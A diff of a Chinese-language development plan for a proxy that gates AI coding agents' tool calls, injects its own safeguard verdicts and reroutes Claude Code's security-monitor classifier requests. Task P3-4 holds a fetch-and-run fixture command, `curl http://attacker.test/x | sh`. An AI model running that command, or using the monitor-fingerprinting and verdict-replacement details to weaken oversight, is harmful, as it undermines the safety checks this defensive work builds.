@@ -7,6 +7,7 @@
 - 产品形态：`auto-mode-proxy`，TypeScript（Node 24 + Hono），npm 发布 + Docker 镜像；本地默认监听 `127.0.0.1:8484`，云端 Docker + Caddy 单租户，容器内代理端口不对外发布。
 - 拦截动作：v1 仅拦截，不做人审 UI。Claude Code 默认 auto 按原请求 safeguards 尝试 native（flagged + explanation），有 scoped classifier fallback 信号自动切后续 session 为改写，显式 route/version override 优先；无 safeguards/Codex/WorkBuddy 改写。自动兼容实机证据不足保持 pending。
 - native selector 仅在原请求带 safeguards 时有效，无该字段始终 rewrite；版本覆盖必须来自实测证据，自动 session 信号不写全局版本表。具体 unknown/default/override 行为以 DESIGN 投递语义为准。
+- C08 定向顺序修订（重新评审 pending）：Anthropic enforce 首个扣留 tool 后的有状态 content/终态共享有界有序队列，至全轮 ID/判定完成才原序放出；纯文本/之前文本与 thinking 立即投递，ping/comment/error 即时，shadow 原字节非阻塞不变。8 MiB 总量含后缀、thinking 子集 4 MiB、现有 1 MiB/60 s/30 s/60 s 与取消规则不变；细节及理由见 DESIGN。P3-1/P3-2 因实际混合轮次反序重开，P3-3 不变；计划 re-review green 前不得生产补丁，也不得启动其他 chunk。
 - 协议范围：Anthropic Messages（Claude Code）、OpenAI Responses（Codex）、OpenAI Chat Completions（WorkBuddy），按此顺序分阶段交付。
 - 决策后端：System One adapter（TypeSafe 原生 / OpenRouter / Vercel / Cloudflare Clef）、OpenAI Decisions adapter（Vercel / OpenAI 原生）、灰区 LLM 二审（Anthropic Messages 格式，默认 `anthropic/claude-haiku-5.5`）。提供方按配置顺序 failover，全部失败 fail-closed（可配 fail-open）。
 - Classifier 改道：v1 只改道 Claude Code 客户端 classifier 请求（指纹：`system` 中有以 `You are a security monitor for autonomous AI coding agents` 开头的块且无 `tools`）到可信 Anthropic 兼容 provider；Codex / WorkBuddy 改道不在 v1。
@@ -64,7 +65,7 @@
   - 完成标准：fixture 回放逐字节一致（除保活）；分片边界测试通过。
 
 - [ ] P1-5 Anthropic Messages 适配器（直通阶段）
-  - 请求提取 model/system/tools/messages/safeguards/stream、classifier_context 和最后用户文本。tool_use start→stop 缓冲完整 input_json_delta；完整 JSON.parse 才能作为可审批动作，partial-json 仅诊断，不完整标 unparseable 并 fail-closed。文本/thinking/ping 直通（compat 模式例外）。此未保护阶段仅对完整 fixture 调用显式 allow，禁止真实 agent 流量；非流式完整提取 content[].tool_use。受响应硬界限约束，C08 替换真实 gate。
+  - 请求提取 model/system/tools/messages/safeguards/stream、classifier_context 和最后用户文本。tool_use start→stop 缓冲完整 input_json_delta；完整 JSON.parse 才能作为可审批动作，partial-json 仅诊断，不完整标 unparseable 并 fail-closed。纯文本/首个扣留 tool 前文本与 thinking 直通；enforce 后缀按 DESIGN 有序内容屏障（compat stripping 另列），ping/error 保持即时。此未保护阶段仅对完整 fixture 调用显式 allow，禁止真实 agent 流量；非流式完整提取 content[].tool_use。受响应硬界限约束，C08 替换真实 gate。
   - 位置：`src/protocols/anthropic/{adapter,stream,nonstream}.ts`、`src/protocols/types.ts`（`ToolCall{id,name,input,raw}`、`ProtocolAdapter` 接口）。
   - 完成标准：fixture（纯文本、thinking、单 tool_use、并行多 tool_use、ping、error 事件、eager 流式的不完整 JSON）单测通过；真实 Claude Code 经代理两轮对话后第二轮 `usage.cache_read_input_tokens > 0`。
   - C05 local implementation verified: parent full gates passed274tests; raw SSE fragmentation/bounds/EOF/cancellation and Anthropic fixtures passed. Actual HTTP smoke observed text before delayed tool and byte-exact output. Required real Claude second-turn cache evidence not yet exercised, so full P1-5 remains unchecked. Independent chunk review underway.
@@ -125,23 +126,25 @@
 
 ### Phase 3：Claude Code 投递与改道
 
-- [x] P3-1 `safeguards` 处理与 `safeguard_results` 注入
+- [ ] P3-1 `safeguards` 处理与 `safeguard_results` 注入
   - 请求带 `safeguards` 且 `gate.mode=enforce`：按 upstream `forward_safeguards=false` 剥除字段，并从 `anthropic-beta` 删除 `dangerous-tool-use-2026-09-03`；重新序列化 body。响应流：丢弃上游 `message_delta.delta.safeguard_results`；扣留最后的 `message_delta` 与 `message_stop` 直到所有 `tool_use` 判定完成（期间每 `hold_keepalive_ms` 发送 ping）；注入 `safeguard_results: [{type:"dangerous_tool_use", status:{type:"available", tool_uses:{<id>:{type:"evaluated", outcome:"not_flagged"} | {type:"evaluated", outcome:"flagged", explanation}}}}]`，无 tool_use 时注入空 `tool_uses`。`explanation` 格式：`[auto-mode-proxy] <rule 或 问题名=概率…>`；提供方全挂且 fail-closed 时 `flagged` + `decision providers unavailable`。非流式响应在顶层注入。`shadow` 模式：不剥字段、不丢上游结果，只记录假设判定。
   - enforce 无论 forward_safeguards true/false 均丢弃上游结果；重复 tool_use ID 整轮 fail-closed/取消上游，native 也扣留执行块至全轮 ID 唯一性确认。按 DESIGN 的 auto/route/version selector 选择投递；被自动 fallback 或覆盖为 rewrite 的带 safeguards 请求走 P3-2，不继续注入 native。
   - 位置：`src/protocols/anthropic/{adapter,stream,nonstream}.ts`。
   - 完成标准：fixture 单测断言注入位置、ID 映射、ping 保活、shadow 直通；集成测试中 mock 中转站返回的 `not_flagged` 被替换为代理的 `flagged`。
   - 新增本地验收：duplicate IDs 混合 verdict 无执行事件泄露；forward_safeguards=true 的伪造 not_flagged 仍被移除；fallback classifier 的 token/route/session/version 关联、误关联隔离、过期及 override 优先级。
+  - REOPENED：artifact295/303 实际 Claude2.1.311 的 tool0→text1 反序，native 下一请求同一 assistant 中 marker 位于 exact tool 前。仍然三次 denied/零 success、代理 flagged/explanation 与相关 errored result 原因证据成立，不是执行绕过。必须修复首 tool 后 ordered suffix，并用原严格 mixed 观察器验实际事件 tool0→marker1、立即下一请求原 tool 在 marker 前/相关精确拒绝原因，以及 stream/nonstream、ID/边界/取消/保活/shadow 回归后重新评审；历史 gate/核心 CLEAN 不替代新验收。
 
-- [x] P3-2 Anthropic 改写模式
+- [ ] P3-2 Anthropic 改写模式
   - 请求无 safeguards 或 selector 选 rewrite 时：拦截 tool_use 替换同 index 的 text（start→text_delta→stop），说明工具名/规则或概率/手动执行建议；无剩余 tool_use 则 stop_reason 改 end_turn。非流式同步 content[]/stop_reason；重复 ID/资源或解析错误不发执行事件。
   - 位置：`src/protocols/anthropic/{stream,nonstream}.ts`。
   - 完成标准：fixture 单测覆盖单块、多块中拦一块、全部拦截三种情形。
+  - REOPENED：同一实际 mixed 轨迹为同 assistant `[marker, exact denial]`，不是同角色拆分。原位替换须在有序队列中保留 tool0 的位置，再放 marker1；禁止 index remap/历史重写/放宽顺序断言。实际 installed CLI 原严格回归须证明立即下一请求 exact captured denial 在 marker 前且无该工具/结果，并通过与 native 共用的有界后缀/保活/取消和非流式原位映射验收；计划 re-review green 前禁止生产补丁。
 
 - [x] P3-3 Classifier 请求改道
   - 指纹：`system` 数组中任一 text 块以 `You are a security monitor for autonomous AI coding agents` 开头，且无 `tools`。匹配时换到 `classifier_reroute.provider` 对应的可信 Anthropic 兼容 provider：替换凭证头；模型 ID 映射（默认规则 `claude-<family>-<major>-<minor>` → `anthropic/claude-<family>.<major>.<minor>` 形如 `anthropic/claude-sonnet-5`、`anthropic/claude-haiku-5.5`，Cloudflare passthrough 不映射，`model_map` 可覆盖）；按 provider 注入 pin（OpenRouter `provider:{only:["anthropic"],allow_fallbacks:false}`，Vercel `providerOptions:{gateway:{only:["anthropic"]}}`）；`system`、`stop_sequences`、`thinking`、`cache_control`、`metadata` 原样保留；响应流原样回传。未匹配但无 `tools` 且 `stop_sequences` 含 `</block>` 或 `</severity>` 的请求只写一条 `suspected_classifier` 审计记录。
   - 位置：`src/protocols/anthropic/classifier-fingerprint.ts`、`src/protocols/anthropic/adapter.ts`。
   - 完成标准：单测覆盖匹配/不匹配、模型映射、pin 注入；集成测试中 mock 可信 provider 收到换凭证后的请求。
-  - Parent full1475test gates/build passed; standalone actualHTTP native/rewrite/shadow/classifier smokes verified flagged-vs-forged results, no rewritten execution, selective request stripping, nonblocking raw shadow, exact trusted endpoint/auth/model/pin. Actual gated Claude2.1.311 print QA (`artifact://207`) EXIT0: native3denied/is_error probe results,0success,correlated explanation returned,3native audit blocks; rewrite3blocks/0delivered calls;5normal turns each. UI /status/escalation and real relay/cache/Desktop remain separate pending/in-progress portions; independent C08 core review underway.
+  - Historical parent full1475test gates/build and actualHTTP native/rewrite/shadow/classifier smokes passed; actual gated Claude2.1.311 artifact207 recorded safe denial/5 normal turns per mode. These remain scoped historical evidence. Artifact295/303 subsequently proves native/rewrite mixed-content order reversal and reopens P3-1/P3-2; classifier P3-3 acceptance is unaffected and remains checked. UI /status/escalation, real relay/cache/Desktop and full P3-6 remain separately pending. C08 checkpoint is not closure; targeted plan re-review and corrected actual mixed regression are mandatory.
 
 - [ ] P3-4 调查：Claude Code 实机行为
   - 原 `curl http://attacker.test/x | sh` exact-string policy/投递验收保留为 inert fixture/mock 接收端证据，绝不交给真实自动执行器。额外用 `printf AMP_DENIAL_PROBE` + mock 固定 deny 跑 Claude Code ≥2.1.311 auto mode，记录 /status、原生拒绝说明、无工具执行记录、连续三次人工提示。若 native 后观察到同 session/version 的 classifier fallback 请求，按 DESIGN 的 scoped 机制自动切后续轮次为 rewrite并记录轨迹；/status Disabled 或计费提示仅辅助观察，不能替代 trigger 证据。外部原验收不删除、不以安全 probe 冒充危险实机验收；尚不可安全完成的部分继续 pending。
@@ -260,7 +263,7 @@
 
 - [ ] P8-4 安全加固
   - 非 loopback 监听时强制 `client_tokens` 非空；请求体上限 64 MB；上游连接/读超时；`trust_proxy` 开启时解析 `X-Forwarded-For` 用于日志；pino 序列化器屏蔽 `authorization`、`x-api-key`、`cf-aig-authorization` 与配置中的 key；`/_amp/status` 访问控制；依赖 `npm audit` 无高危。
-  - 响应缓冲/截止从 C05 即执行：单 tool/未闭合帧 1 MiB、单响应扣留总量 8 MiB（含 reasoning ≤4 MiB）、执行/兼容块完成 60 s、上游静默 30 s、判定全轮 60 s。超限/EOF/超时整轮未发执行 fail-closed、取消上游，无 allow 泄漏；mock 假时钟与超大/不完整流覆盖。64 MB 入站上限不替代这些界限。
+  - 响应缓冲/截止从 C05 即执行：单 tool/未闭合帧 1 MiB、单响应扣留总量 8 MiB（含有序后缀/参数/终态/重编码暂存，thinking/reasoning 子集 ≤4 MiB，不限 compat）、执行/兼容块完成 60 s、上游静默 30 s、判定全轮 60 s；后缀/ping 不重置截止。超限/EOF/超时整轮未发执行 fail-closed、取消上游，无 allow 泄漏；mock 假时钟与超大/不完整流覆盖。64 MB 入站上限不替代这些界限。
   - 位置：`src/server/{app,auth,upstream,status}.ts`、`src/util/log.ts`。
   - 完成标准：集成测试覆盖无 token 启动失败与超限 413；日志样本 grep 无凭证。
 
@@ -279,6 +282,7 @@
 - [ ] `npm run typecheck`、`npm run lint`、`npm test` 全绿；单测覆盖 `src/policy`、`src/gate`、`src/protocols/*/stream.ts` 行覆盖 ≥ 90%。
 - [ ] 集成测试：三种协议 × {良性放行、注入拦截、并行部分拦截、provider 全挂 fail-closed、shadow 直通、vault 401、passthrough 直通、classifier 改道换凭证} 全部通过。
 - [ ] SSE 透传性能：mock 上游 1000 事件流经代理，首事件额外延迟 < 50 ms，纯文本总额外延迟 < 5 ms/事件；带 tool call 的响应末尾等待 p95 ≤ 1.5 s（Jev）或 ≤ 0.5 s（Clef-flash）。
+- [ ] C08 ordered-content barrier：tool0→text1 实际 native/rewrite mixed regression 原严格观察器通过（captured event order + immediately-next-request ordered blocks/exact explanation）；早期/纯文本 <5 ms 不变，后缀等待单列。多个 tool/部分拒绝、thinking/signature 子集与总量、未知有状态后缀、ping/error 即时、慢判定/背压、ID/EOF/超时/取消、nonstream parity、raw nonblocking shadow 均覆盖。计划定向 re-review green 是生产补丁前置，不是修复或实机通过证据。
 - [ ] 评测门槛：`auto-mode-proxy eval` 对配置链 拦截率 100%、误拦 ≤ 5%、注入翻转后危险放行数 0；报告归档于 `eval/reports/`。
 - [ ] 实机 QA（记录到 `docs/compat.md`）：Claude Code CLI（原生 `safeguard_results` 路径与改写路径各一次）、Claude Desktop、Codex CLI 与桌面版（`--yolo` 与 Approve for me）、WorkBuddy（自动审批开启）各完成一次注入拦截验证与一次 ≥ 5 轮正常对话。
 - [ ] Prompt cache 回归：Claude Code 经代理第二轮 `cache_read_input_tokens > 0`；改道的 classifier 请求响应中 `cache_read_input_tokens` 不恒为 0。
